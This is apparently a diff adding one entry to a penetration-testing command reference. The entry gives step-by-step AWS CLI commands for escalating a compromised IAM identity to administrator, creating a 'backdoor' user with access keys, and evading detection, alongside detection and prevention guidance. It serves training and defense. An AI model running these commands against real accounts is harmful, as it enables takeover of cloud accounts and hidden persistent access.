@@ -1,0 +1,125 @@
+{
+  "id": "aws-iam-privesc-backdoor",
+  "name": "AWS - IAM Privilege Escalation & Backdoor User Creation",
+  "command": "aws --profile <profile> iam create-user --user-name backdoor\naws --profile <profile> iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws --profile <profile> iam create-access-key --user-name backdoor",
+  "description": "When a compromised IAM identity has iam:CreateUser, iam:AttachUserPolicy, and iam:CreateAccessKey permissions, create a new backdoor IAM user with full AdministratorAccess. This provides persistent, credential-based access independent of the original compromise vector (e.g., even if Jenkins credentials rotate, the backdoor user persists). The create-access-key response includes the secret access key \u2014 this is the only time AWS returns the secret in plaintext.",
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "iam:CreateUser",
+    "iam:AttachUserPolicy",
+    "iam:CreateAccessKey"
+  ],
+  "tools": [
+    "awscli"
+  ],
+  "tags": [
+    "aws",
+    "cloud",
+    "iam",
+    "persistence",
+    "privilege-escalation",
+    "backdoor"
+  ],
+  "category": "Persistence",
+  "subcategory": "Cloud - AWS",
+  "certifications": [
+    "OSCP"
+  ],
+  "primary_cert": "OSCP",
+  "source": "OSCP PEN-200 Chapter 25: Attacking AWS Cloud Infrastructure (25.6.2)",
+  "examples": [
+    {
+      "label": "Step 1 - Verify current identity and its account ID",
+      "command": "aws --profile jenkins-creds sts get-caller-identity\n# {\"UserId\": \"AIDA...\", \"Account\": \"123456789012\", \"Arn\": \"arn:aws:iam::123456789012:user/app-deployer\"}"
+    },
+    {
+      "label": "Step 2 - Scope current permissions (check for iam:* actions)",
+      "command": "aws --profile jenkins-creds iam list-attached-user-policies --user-name app-deployer\naws --profile jenkins-creds iam get-policy-version --policy-arn <arn> --version-id <v>"
+    },
+    {
+      "label": "Step 3 - Read inline policy if present",
+      "command": "aws --profile jenkins-creds iam list-user-policies --user-name app-deployer\naws --profile jenkins-creds iam get-user-policy --user-name app-deployer --policy-name <policy_name>"
+    },
+    {
+      "label": "Step 4 - Create backdoor IAM user",
+      "command": "aws --profile jenkins-creds iam create-user --user-name backdoor\n# {\"User\": {\"Path\": \"/\", \"UserName\": \"backdoor\", \"UserId\": \"...\", \"Arn\": \"...\"}}"
+    },
+    {
+      "label": "Step 5 - Attach AdministratorAccess managed policy",
+      "command": "aws --profile jenkins-creds iam attach-user-policy \\\n  --user-name backdoor \\\n  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+    },
+    {
+      "label": "Step 6 - Create access keys for backdoor user (SAVE THE SECRET)",
+      "command": "aws --profile jenkins-creds iam create-access-key --user-name backdoor\n# Returns: AccessKeyId + SecretAccessKey (only shown once \u2014 save immediately)\n# {\"AccessKey\": {\"AccessKeyId\": \"AKIA...\", \"SecretAccessKey\": \"...\", \"Status\": \"Active\"}}"
+    },
+    {
+      "label": "Step 7 - Configure backdoor profile and verify admin access",
+      "command": "aws configure --profile backdoor\n# Enter the new AccessKeyId and SecretAccessKey\naws --profile backdoor sts get-caller-identity\naws --profile backdoor iam list-users"
+    },
+    {
+      "label": "Alternative persistence - add existing user to admin group",
+      "command": "aws --profile <profile> iam create-group --group-name AdminGroup\naws --profile <profile> iam attach-group-policy --group-name AdminGroup --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws --profile <profile> iam add-user-to-group --group-name AdminGroup --user-name <existing_user>"
+    },
+    {
+      "label": "Alternative persistence - create inline policy with full access",
+      "command": "aws --profile <profile> iam put-user-policy --user-name backdoor \\\n  --policy-name admin-access \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}'"
+    }
+  ],
+  "notes": "The AdministratorAccess AWS managed policy ARN (arn:aws:iam::aws:policy/AdministratorAccess) is the same across all AWS accounts. This grants full access to all AWS services and resources. The SecretAccessKey is ONLY returned in the create-access-key response \u2014 AWS never shows it again. If lost, delete the access key and create a new one. Alternative: iam:CreateLoginProfile creates a console password (not access keys). Alternative: iam:PutUserPolicy / iam:AttachUserPolicy on a low-privilege existing user silently escalates without creating a new detectable user. CloudTrail logs all IAM API calls \u2014 iam:CreateUser, iam:AttachUserPolicy, and iam:CreateAccessKey appear in the audit trail. Defenders look for unusual iam:Create* calls, especially outside business hours or from unexpected source IPs.",
+  "references": [
+    {
+      "title": "OffSec PEN-200 - Attacking AWS Cloud Infrastructure",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    },
+    {
+      "title": "MITRE ATT&CK - Create Cloud Account",
+      "url": "https://attack.mitre.org/techniques/T1136/003/"
+    },
+    {
+      "title": "Rhino Security Labs - AWS IAM Privilege Escalation",
+      "url": "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "aws-container-enum",
+      "rel": "prereq",
+      "note": "Obtain AWS credentials from container environment before attempting privilege escalation."
+    },
+    {
+      "id": "aws-iam-scope-permissions",
+      "rel": "prereq",
+      "note": "Verify iam:CreateUser and iam:AttachUserPolicy permissions before attempting."
+    },
+    {
+      "id": "aws-terraform-state",
+      "rel": "alternative",
+      "note": "Terraform state files may contain existing high-privilege credentials \u2014 no new user needed."
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1136.003",
+    "T1098.001",
+    "T1078.004"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "IAM privilege escalation exploits permissions that allow a principal to grant itself additional access: iam:CreatePolicyVersion (replace policy with admin version), iam:AttachUserPolicy (attach AdministratorAccess to self), iam:CreateAccessKey (create admin key for another user), iam:AddUserToGroup (add self to admin group), iam:PassRole + lambda:InvokeFunction (pass admin role to Lambda, invoke to get admin API calls). Backdooring creates persistence: new IAM user, extra access keys, or role with external trust.",
+    "prerequisites": "AWS credentials with one or more dangerous IAM permissions (iam:CreatePolicyVersion, iam:AttachUserPolicy, iam:PassRole, iam:CreateAccessKey, etc.). Understanding of IAM escalation paths. Lambda or EC2 for PassRole escalation paths.",
+    "impact": "T1136.003 Create Account: Cloud Account + T1098.001 Account Manipulation: Additional Cloud Credentials + T1078.004 Valid Accounts: Cloud Accounts. Escalates from limited IAM user to admin and creates persistent backdoor access (new IAM user, extra access key, or trusted role). Allows return access even if original credentials are rotated.",
+    "detection": "CloudTrail: iam:CreatePolicyVersion, iam:AttachUserPolicy, iam:CreateUser, iam:CreateAccessKey in quick succession. GuardDuty: 'PrivilegeEscalation:IAMUser/AdministrativePermissions', 'Persistence:IAMUser/UserPermissions'. IAM Access Analyzer: new admin-level policy attachment. CloudWatch: alert on IAM admin role/policy changes.\nDetect use of built-in OS tools (net user, PowerShell, MMC) to create local/domain accounts \u2014 focus on Event ID 4720 paired with process lineage and user context (AN1604). Monitor useradd/adduser invocations and passwd/shadow file modifications (AN1605). Detect dscl commands or user plist changes on macOS (AN1606). Monitor IAM/IdP API calls for new user creation and role assignments (AN1607). Monitor cloud service API/CLI account creation via CloudTrail or equivalent (AN1608) (DET0583).",
+    "artifacts": "CloudTrail: iam:CreatePolicyVersion on admin-level policy | CloudTrail: iam:AttachUserPolicy to self | CloudTrail: iam:CreateUser + iam:CreateAccessKey (backdoor user) | GuardDuty: privilege escalation finding | IAM credential report: new user or key created",
+    "prevention": "Permissions boundaries: even if a role has iam:AttachUserPolicy, a permissions boundary can cap the maximum permissions. SCPs: deny dangerous IAM combinations (iam:CreatePolicyVersion on * without MFA). CloudTrail alerting on all IAM write operations. IAM Access Analyzer continuously evaluates policies. Regular credential report review (new users, access keys). Detective controls: Lambda watching IAM events and alerting on anomalies.\nMulti-factor Authentication: Use MFA for user and privileged accounts.\nNetwork Segmentation: Configure access controls and firewalls to limit access to domain controllers and account management systems.\nOperating System Configuration: Protect domain controllers with proper security configuration.\nPrivileged Account Management: Limit accounts with permission to create other accounts; avoid using domain admin accounts for day-to-day operations.",
+    "evasion": "Make escalation actions look like normal IAM operations (add to existing group rather than create new user). Create access key on a dormant existing user rather than creating a new user. Use PassRole escalation (involves Lambda \u2014 looks like application deployment).",
+    "sources": [
+      "https://attack.mitre.org/techniques/T1136/003/",
+      "https://attack.mitre.org/techniques/T1098/001/",
+      "https://attack.mitre.org/techniques/T1078/004/"
+    ],
+    "misconfiguration": "IAM users have iam:CreatePolicyVersion or iam:AttachUserPolicy for '*'. No permissions boundary enforced. No CloudTrail alerting on IAM write operations. SCPs don't restrict dangerous IAM actions.",
+    "vulnerable_config": "# Escalation via CreatePolicyVersion:\naws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/DevPolicy \\\n  --policy-document '{\"Version\":\"2012-10-17\",\"Statement\":[{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}]}' \\\n  --set-as-default\n# \u2192 DevPolicy now grants admin. Current user has DevPolicy = instant admin\n\n# Backdoor: create new admin user:\naws iam create-user --user-name backdoor-admin\naws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\naws iam create-access-key --user-name backdoor-admin",
+    "secure_config": "# Permissions boundary: cap max permissions even with iam:Attach*:\n# Create boundary policy (max allowed permissions):\naws iam create-policy --policy-name MaxPermBoundary --policy-document file://boundary.json\n# Apply to all created roles/users:\n# Any role created must have this boundary \u2192 cannot exceed it\n\n# SCP: deny iam:CreatePolicyVersion for non-admin:\n# {\n#   'Effect': 'Deny',\n#   'Action': 'iam:CreatePolicyVersion',\n#   'Resource': '*',\n#   'Condition': {\n#     'StringNotEquals': {'aws:PrincipalArn': 'arn:aws:iam::ACCOUNT:role/IAMAdmin'}\n#   }\n# }\n\n# CloudTrail alert: any IAM write operation:\n# { $.eventSource = 'iam.amazonaws.com' && $.readOnly = false }\n# Alert: every IAM modification \u2192 immediate review"
+  }
+}
